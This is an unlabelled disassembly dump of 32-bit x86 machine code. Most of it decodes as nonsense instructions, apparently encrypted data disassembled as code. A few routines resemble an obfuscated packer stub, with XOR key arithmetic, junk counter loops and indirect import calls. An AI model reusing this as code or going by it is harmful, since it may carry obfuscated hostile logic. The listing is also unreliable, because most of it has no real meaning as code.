  40f410:	jne    0x40f488
  40f412:	mov    dl,0xee
  40f414:	repnz mov esi,0xdad9741b
  40f41a:	cmp    BYTE PTR [ebx],dh
  40f41c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f41d:	xor    BYTE PTR [esi],0xee
  40f420:	cmp    dl,BYTE PTR [esi]
  40f422:	daa    
  40f423:	adc    bl,BYTE PTR [esi+0x76]
  40f426:	repnz xchg esi,eax
  40f428:	shr    BYTE PTR [eax+0x29],0xd3
  40f42c:	add    BYTE PTR [edx+0x4f9c3894],dl
  40f432:	div    BYTE PTR [ebp-0xeb86342]
  40f438:	cmp    ebp,DWORD PTR [edi]
  40f43a:	dec    ecx
  40f43b:	mov    ecx,0x4ae28a7c
  40f440:	mov    al,0x7d
  40f442:	dec    eax
  40f443:	shl    bl,cl
  40f445:	sbb    eax,0x93fef56b
  40f44a:	adc    BYTE PTR [esi],bl
  40f44c:	data16 cmp BYTE PTR [ecx+esi*8-0x70],bh
  40f451:	lea    esp,[eax+0x1392b150]
  40f457:	das    
  40f458:	aam    0x24
  40f45a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f45b:	sbb    al,0x7
  40f45d:	xchg   esp,eax
  40f45e:	clc    
  40f45f:	arpl   WORD PTR [ebp+eiz*2+0x57],si
  40f463:	add    BYTE PTR [edi+eiz*1+0x52192371],al
  40f46a:	sar    DWORD PTR [ebx-0x49e0cbfb],0xb2
  40f471:	jmp    0x40f473
  40f473:	cs inc eax
  40f475:	add    bl,BYTE PTR [esi-0x261208df]
  40f47b:	sbb    eax,0x549788de
  40f480:	lods   al,BYTE PTR ds:[esi]
  40f481:	retf   
  40f482:	les    edx,FWORD PTR [edx]
  40f484:	cld    
  40f485:	cld    
  40f486:	daa    
  40f487:	dec    ebp
  40f488:	aas    
  40f489:	cmp    eax,0x50755130
  40f48e:	sbb    bl,BYTE PTR [ecx+0x40]
  40f491:	xor    al,0xff
  40f493:	lods   al,BYTE PTR ds:[esi]
  40f494:	ficomp WORD PTR [ebx+ecx*1+0x2227293d]
  40f49b:	mov    edx,0xdd76a043
  40f4a0:	xchg   BYTE PTR [ebx+ebx*8+0x28],bl
  40f4a4:	and    eax,0xf89e4626
  40f4a9:	sub    cl,bh
  40f4ab:	icebp  
  40f4ac:	mov    ah,0x2
  40f4ae:	sub    ebx,ebp
  40f4b0:	call   0xced7:0xd1d5f38e
  40f4b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f4b8:	sub    bl,ah
  40f4ba:	and    esp,DWORD PTR [ebx-0x7dd97b90]
  40f4c0:	xchg   ebx,eax
  40f4c1:	pushf  
  40f4c2:	jl     0x40f4ce
  40f4c4:	mov    ds:0xf218530d,eax
  40f4c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f4ca:	push   ss
  40f4cb:	adc    bh,cl
  40f4cd:	inc    ebp
  40f4ce:	js     0x40f4df
  40f4d0:	fs pop ds
  40f4d2:	adc    DWORD PTR [esp+ecx*2+0x3ed5931d],eax
  40f4d9:	or     al,0xbf
  40f4db:	jle    0x40f4b3
  40f4dd:	fistp  DWORD PTR [edx]
  40f4df:	sahf   
  40f4e0:	retf   0x68fa
  40f4e3:	dec    eax
  40f4e4:	or     esp,edx
  40f4e6:	test   al,bh
  40f4e8:	ja     0x40f506
  40f4ea:	add    BYTE PTR [ebx-0xf04a849],dl
  40f4f0:	stc    
  40f4f1:	xchg   BYTE PTR [eax-0x51c42665],cl
  40f4f7:	je     0x40f498
  40f4f9:	mov    ebp,DWORD PTR [ebx-0x42a21cb6]
  40f4ff:	repz dec esp
  40f501:	dec    esi
  40f502:	inc    edi
  40f503:	sti    
  40f504:	mov    eax,ds:0xd5be010e
  40f509:	js     0x40f506
  40f50b:	aad    0xba
  40f50d:	add    al,0x27
  40f50f:	sub    ch,ch
  40f511:	div    BYTE PTR [edx]
  40f513:	lahf   
  40f514:	mov    DWORD PTR [eax],esp
  40f516:	ins    BYTE PTR es:[edi],dx
  40f517:	stos   BYTE PTR es:[edi],al
  40f518:	cld    
  40f519:	pop    edi
  40f51a:	cmp    eax,0x59c9256b
  40f51f:	test   ch,0x2a
  40f522:	in     al,0x3d
  40f524:	(bad)  
  40f525:	fiadd  WORD PTR [edx-0x5547abcd]
  40f52b:	pusha  
  40f52c:	fbld   TBYTE PTR [ecx-0xb]
  40f52f:	mov    bh,0x87
  40f531:	fcom   DWORD PTR [edx+edx*8+0x2d089894]
  40f538:	push   ss
  40f539:	mov    dh,0x6a
  40f53b:	imul   esi,DWORD PTR [esi+0x70],0x33
  40f53f:	fwait
  40f540:	inc    eax
  40f541:	inc    edi
  40f542:	mov    BYTE PTR [ecx],ch
  40f544:	cmp    eax,0xf66b7094
  40f549:	out    dx,eax
  40f54a:	ror    BYTE PTR [ebx-0x5241c51f],1
  40f550:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f551:	(bad)  
  40f552:	out    dx,al
  40f553:	cmp    DWORD PTR [ecx+0x6eaad6f4],eax
  40f559:	loop   0x40f527
  40f55b:	xor    al,0xbe
  40f55d:	data16 stos BYTE PTR es:[edi],al
  40f55f:	mov    ah,0xf4
  40f561:	mov    eax,ds:0xcc1b1f
  40f566:	clc    
  40f567:	push   edx
  40f568:	or     ebp,eax
  40f56a:	mov    bl,BYTE PTR [ecx]
  40f56c:	mov    ah,0x31
  40f56e:	fisttp QWORD PTR [ebx-0x4230f1a6]
  40f574:	icebp  
  40f575:	add    DWORD PTR ds:0x1ae310ae,edx
  40f57b:	jg     0x40f598
  40f57d:	imul   esp,esp,0x5c
  40f580:	inc    eax
  40f581:	pushf  
  40f582:	pop    eax
  40f583:	jmp    0x3be026dd
  40f588:	outs   dx,DWORD PTR ds:[esi]
  40f589:	push   es
  40f58a:	cmp    BYTE PTR [ebx-0x79],bl
  40f58d:	mov    al,0x2
  40f58f:	sub    edx,ebp
  40f591:	out    0x1c,al
  40f593:	push   0x3f93d4e2
  40f598:	xor    DWORD PTR [ecx+ecx*4+0x7a],edi
  40f59c:	les    edx,FWORD PTR [esi]
  40f59e:	adc    ecx,ebx
  40f5a0:	lods   al,BYTE PTR ds:[esi]
  40f5a1:	arpl   si,bp
  40f5a3:	xchg   BYTE PTR [ebx+0x46],ch
  40f5a6:	(bad)  
  40f5a7:	int    0x79
  40f5a9:	shr    BYTE PTR [ebx+0x18],1
  40f5ac:	imul   ebp,esi,0xffffff83
  40f5af:	shr    BYTE PTR [edi+0x41],cl
  40f5b2:	fcmovnu st,st(5)
  40f5b4:	and    ah,BYTE PTR [ebx+0x3f]
  40f5b7:	call   0xbc38:0x6b48f6e3
  40f5be:	pop    ecx
  40f5bf:	add    eax,0x20d2a411
  40f5c4:	mov    bh,0xb7
  40f5c6:	and    al,0x2e
  40f5c8:	adc    al,0x52
  40f5ca:	ss aaa 
  40f5cc:	xor    BYTE PTR [ecx],bl
  40f5ce:	add    DWORD PTR [edi-0x144859c9],edi
  40f5d4:	and    DWORD PTR [edi],ecx
  40f5d6:	inc    eax
  40f5d7:	imul   eax,DWORD PTR [ecx+eiz*1-0x5],0xffffffe3
  40f5dc:	push   edi
  40f5dd:	out    dx,al
  40f5de:	push   ebp
  40f5df:	or     ecx,edx
  40f5e1:	xor    eax,0x58ac3129
  40f5e6:	push   ebp
  40f5e7:	push   esi
  40f5e8:	mul    DWORD PTR [ecx]
  40f5ea:	xchg   ecx,eax
  40f5eb:	sbb    DWORD PTR [edx-0x4571d57b],eax
  40f5f1:	mov    al,0x56
  40f5f3:	and    BYTE PTR [ebp-0x68],bl
  40f5f6:	cmp    al,0xfa
  40f5f8:	loope  0x40f5f7
  40f5fa:	mov    edx,0xce6714d7
  40f5ff:	dec    eax
  40f600:	cmp    DWORD PTR [eax+0x30],edx
  40f603:	jo     0x40f5d0
  40f605:	jmp    0xae8c:0x4f5ee0dd
  40f60c:	jle    0x40f592
  40f60e:	test   al,0xeb
  40f610:	ret    0x5274
  40f613:	add    BYTE PTR ds:0x3770ca2f,bh
  40f619:	(bad)  
  40f61a:	jb     0x40f5f3
  40f61c:	cdq    
  40f61d:	addr16 cli 
  40f61f:	ja     0x40f5d0
  40f621:	dec    edi
  40f622:	mov    bh,0xb3
  40f624:	jo     0x40f5ce
  40f626:	jo     0x40f5aa
  40f628:	outs   dx,BYTE PTR ds:[esi]
  40f629:	add    eax,0x6f64888
  40f62e:	inc    eax
  40f62f:	lahf   
  40f630:	in     al,dx
  40f631:	(bad)  
  40f632:	cmc    
  40f633:	in     al,dx
  40f634:	out    0x1f,eax
  40f636:	repz add ebp,DWORD PTR [ebp-0x65]
  40f63a:	cmc    
  40f63b:	mov    esi,DWORD PTR [edi]
  40f63d:	add    esi,DWORD PTR [esp+eax*8+0x78b5d5dc]
  40f644:	pop    ss
  40f645:	and    eax,0x2f64f966
  40f64a:	add    eax,0x22c2ebb2
  40f64f:	add    ch,BYTE PTR [esi+0x40504036]
  40f655:	retf   
  40f656:	pushf  
  40f657:	call   0xeefb1eca
  40f65c:	mov    dh,0xce
  40f65e:	and    eax,0x7f2f8deb
  40f663:	xchg   ecx,eax
  40f664:	mov    bl,0xd2
  40f666:	mov    ds:0x695ab23e,al
  40f66b:	pop    edi
  40f66c:	push   ebp
  40f66d:	mov    ecx,0xc70cc6f9
  40f672:	push   cs
  40f673:	or     al,0x3d
  40f675:	or     DWORD PTR [edi-0x742a560f],ecx
  40f67b:	or     BYTE PTR [edi-0x19],dh
  40f67e:	or     eax,0xe09f08e
  40f683:	retf   
  40f684:	fdivr  st,st(2)
  40f686:	and    cl,dl
  40f688:	aas    
  40f689:	pop    esi
  40f68a:	cmp    DWORD PTR [ebx],esp
  40f68c:	sbb    BYTE PTR [esi-0x78],dh
  40f68f:	fild   WORD PTR [ebp+0x6cd18c8c]
  40f695:	cwde   
  40f696:	fsub   st,st(2)
  40f698:	cmp    al,0x11
  40f69a:	pop    edx
  40f69b:	cmp    eax,0x64cc1e43
  40f6a0:	push   0xaaa266c7
  40f6a5:	cli    
  40f6a6:	sahf   
  40f6a7:	sub    eax,0x109b1526
  40f6ac:	mov    BYTE PTR ds:0xf383175d,ch
  40f6b2:	lods   eax,DWORD PTR ds:[esi]
  40f6b3:	gs ins BYTE PTR es:[edi],dx
  40f6b5:	jge    0x40f640
  40f6b7:	mov    gs,ebp
  40f6b9:	mov    al,0x7a
  40f6bb:	dec    ebx
  40f6bc:	call   0xcc23:0x1d29c2ab
  40f6c3:	adc    eax,0x6c1576be
  40f6c8:	sub    DWORD PTR [ecx-0x35f10b89],ecx
  40f6ce:	shl    DWORD PTR [esi+0x23fc1280],cl
  40f6d4:	adc    eax,0x52106bf8
  40f6d9:	mov    ebp,DWORD PTR [ebx]
  40f6db:	sub    cl,bl
  40f6dd:	fadd   st,st(4)
  40f6df:	push   ds
  40f6e0:	pop    ebp
  40f6e1:	aam    0x42
  40f6e3:	jle    0x40f727
  40f6e5:	enter  0xcd35,0x54
  40f6e9:	lahf   
  40f6ea:	out    0xa7,eax
  40f6ec:	push   ds
  40f6ed:	outs   dx,BYTE PTR ds:[esi]
  40f6ee:	jae    0x40f683
  40f6f0:	arpl   bp,bx
  40f6f2:	inc    ecx
  40f6f3:	xor    edx,DWORD PTR [esi-0x5e020f16]
  40f6f9:	repnz mov WORD PTR [edi],?
  40f6fc:	xor    cl,cl
  40f6fe:	jge    0x40f72f
  40f700:	(bad)  
  40f701:	call   0xe95bf8c2
  40f706:	adc    DWORD PTR [ecx+0x268058e0],0x6d
  40f70d:	mov    al,0x75
  40f70f:	imul   ebp,DWORD PTR [ecx],0x3d
  40f712:	fild   DWORD PTR [edx-0x2b580e15]
  40f718:	mov    dh,0x66
  40f71a:	mov    WORD PTR [ebp-0x64],?
  40f71d:	in     al,dx
  40f71e:	(bad)  
  40f71f:	call   0xa279:0x2dc35b7f
  40f726:	jns    0x40f6ef
  40f728:	adc    esi,esp
  40f72a:	vpaddsb ymm1,ymm5,YMMWORD PTR [edx-0x241f21ec]
  40f732:	in     al,0x50
  40f734:	and    eax,0x26772da3
  40f739:	adc    DWORD PTR [edx+0x5a3ce4be],edx
  40f73f:	or     eax,0x393218b
  40f744:	daa    
  40f745:	and    dh,cl
  40f747:	(bad)  
  40f748:	cmp    BYTE PTR [ebp-0x3a],dl
  40f74b:	adc    al,0x1f
  40f74d:	ds call 0x509a:0xaa03737c
  40f755:	fstp   DWORD PTR [esi-0x10790589]
  40f75b:	xor    ch,ch
  40f75d:	jmp    0x4fbdb02
  40f762:	fmul   QWORD PTR [ebp-0x11e30575]
  40f768:	in     eax,dx
  40f769:	mov    ds:0x299efcc,eax
  40f76e:	inc    eax
  40f76f:	and    eax,0x62b98ffe
  40f774:	jne    0x40f784
  40f776:	xlat   BYTE PTR ds:[ebx]
  40f777:	or     BYTE PTR [edx+0x2125f5e8],0x5d
  40f77e:	fs das 
  40f780:	push   ecx
  40f781:	out    0x56,eax
  40f783:	cmc    
  40f784:	(bad)  
  40f785:	pop    edx
  40f786:	fcom   st(6)
  40f788:	cmova  ebx,DWORD PTR [ebx-0x7f53d413]
  40f78f:	jo     0x40f7bf
  40f791:	push   eax
  40f792:	pop    ss
  40f793:	fld    st(7)
  40f795:	cs push ebp
  40f797:	sbb    bh,0x12
  40f79a:	xchg   ebx,eax
  40f79b:	imul   ebx,DWORD PTR [ecx-0x48edbec7],0xa188d144
  40f7a5:	pusha  
  40f7a6:	inc    ebp
  40f7a7:	test   al,0xd0
  40f7a9:	mov    BYTE PTR [ecx-0x37],0xde
  40f7ad:	dec    ebp
  40f7ae:	lods   eax,DWORD PTR ds:[esi]
  40f7af:	pmaxub mm1,mm1
  40f7b2:	cs inc esp
  40f7b4:	mov    cl,0x34
  40f7b6:	mov    eax,ds:0x92cfb07e
  40f7bb:	dec    esp
  40f7bc:	gs ret 
  40f7be:	clc    
  40f7bf:	jmp    0x40f803
  40f7c1:	in     eax,dx
  40f7c2:	add    bh,BYTE PTR [eax+0x46]
  40f7c5:	imul   edi,DWORD PTR [esi+0x61931025],0xd3c79d9e
  40f7cf:	outs   dx,BYTE PTR ds:[esi]
  40f7d0:	les    ebx,FWORD PTR [eax-0x40]
  40f7d3:	mov    ecx,0x83b60057
  40f7d8:	adc    eax,0xe2352188
  40f7dd:	mov    esi,0x6853751
  40f7e2:	xlat   BYTE PTR ds:[ebx]
  40f7e3:	xchg   ecx,eax
  40f7e4:	mov    ss,WORD PTR [eax+0x3e]
  40f7e7:	imul   eax,DWORD PTR [edx-0x71e20a42],0xbe173e6f
  40f7f1:	test   DWORD PTR [ebp-0x2ca81d70],ecx
  40f7f7:	cmp    ecx,0x12
  40f7fa:	inc    edx
  40f7fb:	daa    
  40f7fc:	pushf  
  40f7fd:	inc    edi
  40f7fe:	adc    eax,0xb16abff5
  40f803:	fistp  DWORD PTR [ebx-0x5b]
  40f806:	mov    BYTE PTR [eax],ch
  40f808:	xchg   esi,eax
  40f809:	aad    0x6
  40f80b:	lods   al,BYTE PTR ds:[esi]
  40f80c:	ret    0xa72a
  40f80f:	mov    cl,0x8
  40f811:	(bad)  
  40f812:	cli    
  40f813:	cmc    
  40f814:	loopne 0x40f7d2
  40f816:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f817:	ret    
  40f818:	xor    ch,BYTE PTR [eax-0x164fa6ec]
  40f81e:	jecxz  0x40f819
  40f820:	and    bl,BYTE PTR [eax+0x63]
  40f823:	jmp    0xe771:0x199a4f2b
  40f82a:	idiv   BYTE PTR [ebp+0x37]
  40f82d:	mov    BYTE PTR [ecx-0x58],bl
  40f830:	imul   ecx,DWORD PTR [ebx-0x29445bb5],0x1a
  40f837:	fstp   QWORD PTR [edx-0xfa5bb10]
  40f83d:	inc    edi
  40f83e:	xchg   ecx,eax
  40f83f:	mov    edi,0x383f56a
  40f844:	(bad)  
  40f846:	adc    al,0x7b
  40f848:	xchg   ebp,eax
  40f849:	fisttp QWORD PTR [edi+0x71]
  40f84c:	mov    ch,0x25
  40f84e:	add    bh,BYTE PTR [eax]
  40f850:	and    cl,dh
  40f852:	(bad)  
  40f853:	pop    edi
  40f854:	xchg   ecx,eax
  40f855:	dec    eax
  40f856:	xchg   ecx,eax
  40f857:	dec    ecx
  40f858:	xchg   ecx,edx
  40f85a:	dec    edx
  40f85b:	push   edx
  40f85c:	mov    edx,ebx
  40f85e:	pop    ebx
  40f85f:	dec    ebx
  40f860:	call   DWORD PTR [ebx]
  40f862:	cmp    DWORD PTR [ebp+0x10],esi
  40f865:	je     0x40f884
  40f86b:	xchg   edx,eax
  40f86c:	push   0xb
  40f86e:	pop    ecx
  40f86f:	push   0x4
  40f871:	pop    ebx
  40f872:	inc    ebx
  40f873:	xchg   ebx,ecx
  40f875:	sub    ebx,ecx
  40f877:	xchg   ebx,ecx
  40f879:	dec    ecx
  40f87a:	dec    ecx
  40f87b:	mov    eax,DWORD PTR [ebp-0x1c]
  40f87e:	imul   eax,ecx
  40f881:	add    esp,eax
  40f883:	xchg   edx,eax
  40f884:	push   eax
  40f885:	xor    ebx,ebx
  40f887:	mov    edx,esp
  40f889:	dec    edx
  40f88a:	inc    ebx
  40f88b:	add    ebx,DWORD PTR [edx+ebx*1]
  40f88e:	dec    ebx
  40f88f:	xor    edx,edx
  40f891:	add    DWORD PTR [ebp-0xc],ebx
  40f894:	pop    ebx
  40f895:	mov    eax,DWORD PTR [ebp-0xc]
  40f898:	pop    edi
  40f899:	pop    esi
  40f89a:	pop    ebx
  40f89b:	leave  
  40f89c:	ret    0x10
  40f89f:	push   ebp
  40f8a0:	mov    ebp,esp
  40f8a2:	push   ecx
  40f8a3:	mov    DWORD PTR [ebp-0x4],0xf89c85ba
  40f8aa:	add    DWORD PTR ds:0x42c010,0x33e6
  40f8b4:	mov    eax,DWORD PTR [ebp-0x4]
  40f8b7:	or     edx,ecx
  40f8b9:	mov    edx,DWORD PTR [ebp+0x10]
  40f8bc:	mov    ecx,0x7510893
  40f8c1:	xor    eax,ecx
  40f8c3:	and    DWORD PTR ds:0x42d008,0x1b89
  40f8cd:	add    eax,0x3272db
  40f8d2:	or     DWORD PTR ds:0x42a01c,0x429008
  40f8dc:	mov    DWORD PTR [edx],eax
  40f8de:	and    DWORD PTR ds:0x42c01c,0x0
  40f8e8:	xor    eax,eax
  40f8ea:	add    eax,DWORD PTR ds:0x42c01c
  40f8f0:	inc    eax
  40f8f1:	mov    ds:0x42c01c,eax
  40f8f6:	cmp    DWORD PTR ds:0x42c01c,0x28
  40f8fd:	jne    0x40f90f
  40f903:	push   DWORD PTR [ebp-0x20]
  40f906:	push   DWORD PTR [ebp-0x20]
  40f909:	call   DWORD PTR ds:0x425034
  40f90f:	cmp    DWORD PTR ds:0x42c01c,0x1d
  40f916:	jb     0x40f8e8
  40f91c:	and    DWORD PTR ds:0x42d01c,0x0
  40f926:	jmp    0x40f938
  40f92b:	mov    edx,DWORD PTR ds:0x42d01c
  40f931:	inc    edx
  40f932:	mov    DWORD PTR ds:0x42d01c,edx
  40f938:	cmp    DWORD PTR ds:0x42d01c,0x1b
  40f93f:	jae    0x40f96c
  40f945:	cmp    DWORD PTR ds:0x42d01c,0x1d
  40f94c:	jne    0x40f967
  40f952:	push   0x4245a8
  40f957:	push   0x424558
  40f95c:	push   0x42c7
  40f961:	call   DWORD PTR ds:0x42503c
  40f967:	jmp    0x40f92b
  40f96c:	mov    eax,DWORD PTR [ebp+0xc]
  40f96f:	xor    eax,ecx
  40f971:	push   esi
  40f972:	mov    esi,DWORD PTR [ebp+0x10]
  40f975:	mov    edx,0x3272db
  40f97a:	add    eax,edx
  40f97c:	mov    DWORD PTR [esi+0x4],eax
  40f97f:	mov    eax,DWORD PTR [ebp+0x14]
  40f982:	mov    esi,DWORD PTR [ebp+0x10]
  40f985:	mov    DWORD PTR [esi+0x8],eax
  40f988:	mov    eax,DWORD PTR [ebp+0x18]
  40f98b:	mov    esi,DWORD PTR [ebp+0x10]
  40f98e:	mov    DWORD PTR [esi+0xc],eax
  40f991:	mov    eax,DWORD PTR [ebp+0x1c]
  40f994:	mov    esi,DWORD PTR [ebp+0x10]
  40f997:	mov    DWORD PTR [esi+0x10],eax
  40f99a:	mov    eax,DWORD PTR [ebp+0x8]
  40f99d:	xor    eax,ecx
  40f99f:	add    eax,edx
  40f9a1:	pop    esi
  40f9a2:	leave  
  40f9a3:	ret    0x18
  40f9a6:	push   ebp
  40f9a7:	mov    ebp,esp
  40f9a9:	mov    eax,ds:0x42404e
  40f9ae:	mov    eax,DWORD PTR [eax+0x1c8]
  40f9b4:	mov    eax,DWORD PTR [eax]
  40f9b6:	movzx  ecx,BYTE PTR ds:0x429000
  40f9bd:	and    DWORD PTR ds:0x42d010,ecx
  40f9c3:	cdq    
  40f9c4:	push   ebx
  40f9c5:	add    DWORD PTR ds:0x42a008,0x429020
  40f9cf:	mov    ecx,0xfabdbef1
  40f9d4:	add    eax,ecx
  40f9d6:	mov    DWORD PTR ds:0x42d008,0x7e66
  40f9e0:	adc    edx,0xffffffff
  40f9e3:	or     DWORD PTR ds:0x42a014,edi
  40f9e9:	push   esi
  40f9ea:	push   edi
  40f9eb:	and    DWORD PTR ds:0x42a00c,0x0
  40f9f5:	jmp    0x40fa09
  40f9fa:	xor    ebx,ebx
  40f9fc:	or     ebx,DWORD PTR ds:0x42a00c
  40fa02:	inc    ebx
  40fa03:	mov    DWORD PTR ds:0x42a00c,ebx
  40fa09:	cmp    DWORD PTR ds:0x42a00c,0x1b
  40fa10:	jae    0x40fa41
  40fa16:	cmp    DWORD PTR ds:0x42a00c,0x26
  40fa1d:	jne    0x40fa36
  40fa23:	push   0x7619
  40fa28:	push   0x3c20
  40fa2d:	push   DWORD PTR [ebp-0x18]
  40fa30:	call   DWORD PTR ds:0x425040
  40fa36:	jmp    0x40f9fa
  40fa3b:	adc    ebx,DWORD PTR ds:0x42d018
  40fa41:	mov    edi,edx
  40fa43:	mov    edx,DWORD PTR [ebp+0x8]
  40fa46:	mov    DWORD PTR ds:0x42c000,0x5718
  40fa50:	mov    ebx,eax
  40fa52:	and    DWORD PTR ds:0x42c004,0x67ab
  40fa5c:	mov    eax,0x8a29a123
  40fa61:	xor    esi,esi
  40fa63:	or     DWORD PTR ds:0x429024,0x42d014
  40fa6d:	xor    ebx,eax
  40fa6f:	or     DWORD PTR ds:0x42d000,0x42a014
  40fa79:	xor    edi,0x0
  40fa7c:	and    DWORD PTR ds:0x42d000,0x42a00c
  40fa86:	add    edx,ecx
  40fa88:	adc    esi,0xffffffff
  40fa8b:	xor    edx,eax
  40fa8d:	or     DWORD PTR ds:0x42c010,0x42b010
  40fa97:	jmp    0x411e4e
  40fa9c:	mov    WORD PTR [ebx+0x6643964b],?
  40faa2:	arpl   WORD PTR [ebx+0x42],sp
  40faa5:	jno    0x40fa92
  40faa7:	rcr    ch,cl
  40faa9:	gs pop ds
  40faab:	popa   
  40faac:	js     0x40fa3c
  40faae:	bound  esp,QWORD PTR [edx-0x38]
  40fab1:	pop    edi
  40fab2:	bound  esp,QWORD PTR [edx-0x2f]
  40fab5:	xchg   ebx,eax
  40fab6:	out    dx,al
  40fab7:	(bad)  
  40fab8:	(bad)  
  40faba:	pop    edi
  40fabb:	out    dx,eax
  40fabc:	push   esi
  40fabd:	add    eax,0xaa62ea9e
  40fac2:	(bad)  
  40fac3:	bound  edi,QWORD PTR [ecx]
  40fac5:	mov    ?,WORD PTR [ebx]
  40fac7:	push   cs
  40fac8:	jb     0x40faf2
  40faca:	xor    edi,esp
  40facc:	adc    al,0x22
  40face:	sbb    cl,BYTE PTR [esi]
  40fad0:	bound  ebp,QWORD PTR [ebx]
  40fad2:	aas    
  40fad3:	xchg   ebp,eax
  40fad4:	cmp    eax,0x64b5b8dc
  40fad9:	inc    ecx
  40fada:	ds dec edi
  40fadc:	(bad)  
  40fadd:	stos   BYTE PTR es:[edi],al
  40fade:	inc    ebx
  40fadf:	in     al,0x25
  40fae1:	popa   
  40fae2:	es adc DWORD PTR fs:[eax+0x33],ebx
  40fae7:	lea    ebp,[ebx]
  40fae9:	mov    esp,0xabec2eb2
  40faee:	fs cmp al,0x31
  40faf1:	lea    ebx,[ebp+0x6e251549]
  40faf7:	inc    ebx
  40faf8:	add    eax,0x26193fa1
  40fafd:	cmp    DWORD PTR ds:[ecx+eax*8],ecx
  40fb01:	sub    BYTE PTR [edx+0x767f11d1],bh
  40fb07:	sbb    al,BYTE PTR [ebx-0x17]
  40fb0a:	pop    ebx
  40fb0b:	ret    
  40fb0c:	lock mov ah,0x75
  40fb0f:	jno    0x40faf7
  40fb11:	pop    es
  40fb12:	(bad)  
  40fb13:	push   ss
  40fb14:	lock inc ebp
  40fb16:	adc    edi,ebp
  40fb18:	sub    ah,dl
  40fb1a:	(bad)  
  40fb1c:	sbb    BYTE PTR [eax],al
  40fb1e:	sub    cl,dh
  40fb20:	inc    esi
  40fb21:	data16 adc al,0xbd
  40fb24:	loope  0x40faf1
  40fb26:	repnz in al,0x0
  40fb29:	or     esp,DWORD PTR ss:[ebx+0x50]
  40fb2d:	add    dh,BYTE PTR [ebx]
  40fb2f:	ja     0x40fab8
  40fb31:	(bad)  
  40fb32:	sar    cl,1
  40fb34:	mov    eax,0x83150a52
  40fb39:	cli    
  40fb3a:	xor    eax,0x830f4c36
  40fb3f:	or     eax,0x8077836e
  40fb44:	cmp    eax,0xa315b5b
  40fb49:	pop    esp
  40fb4a:	mov    BYTE PTR [ecx-0x7e],al
  40fb4d:	push   0x72
  40fb4f:	sbb    eax,0x8c8aebf5
  40fb54:	out    0x6c,al
  40fb56:	mov    ebx,0x1b2a3e48
  40fb5b:	int    0xcc
  40fb5d:	cmp    eax,0x61f30184
  40fb62:	inc    edi
  40fb63:	in     al,0x65
  40fb65:	sub    esi,DWORD PTR [ebp+0x46]
  40fb68:	fiadd  WORD PTR [ebp+0x7e]
  40fb6b:	call   0xa24fe710
  40fb70:	(bad)  
  40fb71:	xchg   ebx,eax
  40fb72:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  40fb74:	or     eax,0x22c0bb87
  40fb79:	sub    esi,DWORD PTR [edi-0x76c44018]
  40fb7f:	inc    ebp
  40fb80:	cmp    al,0x36
  40fb82:	push   esi
  40fb83:	mov    ds:0xd0af6abd,al
  40fb88:	and    DWORD PTR [ebp+0x6f523f71],0xffffffdc
  40fb8f:	jb     0x40fb8d
  40fb91:	(bad)  
  40fb92:	and    eax,0x5db81361
  40fb97:	adc    DWORD PTR [esi+edi*2-0x2b5c00fd],eax
  40fb9e:	mov    bl,0x16
  40fba0:	idiv   edx
  40fba2:	aam    0x25
  40fba4:	dec    esi
  40fba5:	daa    
  40fba6:	ss jg  0x40fbda
  40fba9:	pop    ds
  40fbaa:	shl    DWORD PTR [edx+edi*2+0x47],1
  40fbae:	xor    eax,0x2d866b2c
  40fbb3:	xchg   edx,eax
  40fbb4:	fidivr WORD PTR [edx]
  40fbb6:	mul    BYTE PTR ds:0x4ac888eb
  40fbbc:	inc    eax
  40fbbd:	cmp    BYTE PTR [eax],dl
  40fbbf:	mov    ecx,0xe774aa0c
  40fbc4:	into   
  40fbc5:	xchg   esp,eax
  40fbc6:	sbb    BYTE PTR ds:[ecx-0x6b750bfe],al
  40fbcd:	sub    BYTE PTR [eax+0x72],0xe9
  40fbd1:	inc    edi
  40fbd2:	sbb    bl,BYTE PTR [edi]
  40fbd4:	adc    DWORD PTR [ecx+0x14],edx
  40fbd7:	bound  ebp,QWORD PTR [edi]
  40fbd9:	mov    eax,ds:0xcc7eddc
  40fbde:	mov    ecx,0x9438d147
  40fbe3:	jmp    0x40fc22
  40fbe5:	ja     0x40fb95
  40fbe7:	inc    ecx
  40fbe8:	shl    dl,1
  40fbea:	repz cmp eax,0x5a555eac
  40fbf0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fbf1:	mov    eax,ds:0x6372fd49
  40fbf6:	pushf  
  40fbf7:	rcr    BYTE PTR [edx],cl
  40fbf9:	imul   esp,DWORD PTR [ebp+0x49],0xffffffb5
  40fbfd:	inc    eax
  40fbfe:	sbb    BYTE PTR [edi+0xb],bh
  40fc01:	lahf   
  40fc02:	and    DWORD PTR [edi+0x54],ebp
  40fc05:	dec    edi
  40fc06:	(bad)  [edx+0x73b9ecf2]
  40fc0c:	pop    edi
  40fc0d:	adc    eax,0x13265407
  40fc12:	cs enter 0x33ee,0x68
  40fc17:	aam    0x6d
  40fc19:	dec    ebp
  40fc1a:	test   DWORD PTR [edx-0x5cf29b37],eax
  40fc20:	push   es
  40fc21:	mov    al,ds:0x94aa972f
  40fc26:	xor    al,0x9c
  40fc28:	daa    
  40fc29:	int3   
  40fc2a:	xor    eax,0x5b93d6f
  40fc2f:	scas   al,BYTE PTR es:[edi]
  40fc30:	jae    0x40fc98
  40fc32:	jno    0x40fc8a
  40fc34:	in     eax,0xeb
  40fc36:	mov    ebp,0xa0498913
  40fc3b:	mov    dh,0x3f
  40fc3d:	fisubr WORD PTR [edi-0x40e217d8]
  40fc43:	mov    edi,0x4e85403e
  40fc48:	mov    bh,0xc5
  40fc4b:	pop    edx
  40fc4c:	sbb    BYTE PTR [edi-0x6a392823],0xa4
  40fc53:	cwde   
  40fc54:	push   ecx
  40fc55:	aas    
  40fc56:	sbb    al,0x20
  40fc58:	into   
  40fc59:	es scas eax,DWORD PTR es:[edi]
  40fc5b:	les    esi,FWORD PTR [edi-0x68401b17]
  40fc61:	cmp    BYTE PTR [edi-0x6b],dl
  40fc64:	pop    eax
  40fc65:	sti    
  40fc66:	jno    0x40fc6f
  40fc68:	js     0x40fc3c
  40fc6a:	daa    
  40fc6b:	and    bh,dl
